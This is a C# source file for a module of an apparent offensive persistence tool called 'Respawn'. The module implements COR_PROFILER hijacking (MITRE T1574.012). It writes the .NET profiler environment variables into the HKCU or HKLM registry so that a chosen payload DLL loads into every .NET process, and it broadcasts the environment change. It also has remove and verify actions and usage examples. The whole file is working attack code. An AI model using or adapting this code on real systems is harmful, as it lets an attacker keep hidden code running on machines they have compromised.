using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.CorProfiler
{
    public class CorProfilerModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "cor";
        public string Name        => "COR_PROFILER Hijacking";
        public string Mitre       => "T1574.012";
        public string Description => "Persist by abusing the .NET CLR profiling API to load a malicious DLL into every .NET process";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string HkcuPath = @"Environment";
        const string HklmPath = @"SYSTEM\CurrentControlSet\Control\Session Manager\Environment";

        // GUID used to identify our profiler — must match what DLL reports
        const string ProfilerGuid = "{11111111-1111-1111-1111-111111111111}";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            // Console.ForegroundColor = ConsoleColor.Yellow;
            // Console.WriteLine("  MINIMUM PRIVILEGE:");
            // Console.ResetColor();
            // Console.WriteLine("    hkcu-profiler: None — standard user");
            // Console.WriteLine("    hklm-profiler: Local Administrator\n");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  ACTIONS:");
            Console.ResetColor();
            Console.WriteLine("    install, remove, verify, list-keys\n");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderOption("-k,  --key",     "Registry location to use (see list-keys)");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to profiler DLL");
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderExample("Respawn -t cor -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t cor -a install -k hkcu-profiler -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t cor -a verify  -k hkcu-profiler");
            TechniqueHelpBuilder.RenderExample("Respawn -t cor -a remove  -k hkcu-profiler");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return CorProfilerKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = CorProfilerKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key '{ctx.Key}'. Use -a list-keys.");

            try
            {
                using var regKey = OpenKey(ctx.Key, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening environment registry key. Run as administrator.");

                // check if already installed
                if (regKey.GetValue("COR_ENABLE_PROFILING") != null)
                    return TechniqueResult.Exists("COR_PROFILER already registered in this environment.");

                // set the three required environment variables
                regKey.SetValue("COR_ENABLE_PROFILING", "1",            RegistryValueKind.String);
                regKey.SetValue("COR_PROFILER",          ProfilerGuid,  RegistryValueKind.String);
                regKey.SetValue("COR_PROFILER_PATH",     ctx.Payload,   RegistryValueKind.String);

                // notify Windows of environment change
                NotifyEnvironmentChange();

                return TechniqueResult.Ok(
                    $"Installed COR_PROFILER -> '{ctx.Payload}' | " +
                    $"GUID: '{ProfilerGuid}' | " +
                    $"Fires on every .NET process launch. " +
                    $"New terminal session required to pick up changes.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var key = CorProfilerKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key '{ctx.Key}'. Use -a list-keys.");

            try
            {
                using var regKey = OpenKey(ctx.Key, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening environment registry key. Run as administrator.");

                if (regKey.GetValue("COR_ENABLE_PROFILING") == null)
                    return TechniqueResult.NotFound("COR_PROFILER not found in this environment.");

                regKey.DeleteValue("COR_ENABLE_PROFILING", throwOnMissingValue: false);
                regKey.DeleteValue("COR_PROFILER",          throwOnMissingValue: false);
                regKey.DeleteValue("COR_PROFILER_PATH",     throwOnMissingValue: false);

                // notify Windows of environment change
                NotifyEnvironmentChange();

                return TechniqueResult.Ok("Removed COR_PROFILER from environment.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var key = CorProfilerKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key '{ctx.Key}'. Use -a list-keys.");

            try
            {
                using var regKey = OpenKey(ctx.Key, writable: false);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening environment registry key.");

                string? enabled  = regKey.GetValue("COR_ENABLE_PROFILING")?.ToString();
                string? guid     = regKey.GetValue("COR_PROFILER")?.ToString();
                string? dllPath  = regKey.GetValue("COR_PROFILER_PATH")?.ToString();

                if (enabled == null)
                    return TechniqueResult.NotFound("COR_PROFILER not found in this environment.");

                bool dllExists = !string.IsNullOrEmpty(dllPath) && System.IO.File.Exists(dllPath);

                return TechniqueResult.Ok(
                    $"Verified COR_PROFILER | " +
                    $"Enabled: {enabled} | " +
                    $"GUID: '{guid}' | " +
                    $"DLL: '{dllPath}' | " +
                    $"DLL exists: {dllExists}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private RegistryKey? OpenKey(string keyId, bool writable)
        {
            if (keyId.Equals("hkcu-profiler", StringComparison.OrdinalIgnoreCase))
                return Microsoft.Win32.Registry.CurrentUser.OpenSubKey(HkcuPath, writable: writable);
            else
                return Microsoft.Win32.Registry.LocalMachine.OpenSubKey(HklmPath, writable: writable);
        }

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        static extern IntPtr SendMessageTimeout(
            IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam,
            uint fuFlags, uint uTimeout, out UIntPtr lpdwResult);

        private void NotifyEnvironmentChange()
        {
            try
            {
                // broadcast WM_SETTINGCHANGE to notify all windows of environment change
                UIntPtr result;
                SendMessageTimeout(
                    new IntPtr(0xFFFF), // HWND_BROADCAST
                    0x001A,             // WM_SETTINGCHANGE
                    UIntPtr.Zero,
                    "Environment",
                    0x0002,             // SMTO_ABORTIFHUNG
                    5000,
                    out result);
            }
            catch { }
        }

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Key))
            {
                error = "No key specified. Use -k <key-id> or see -a list-keys.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                error = "COR_PROFILER requires a DLL payload.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}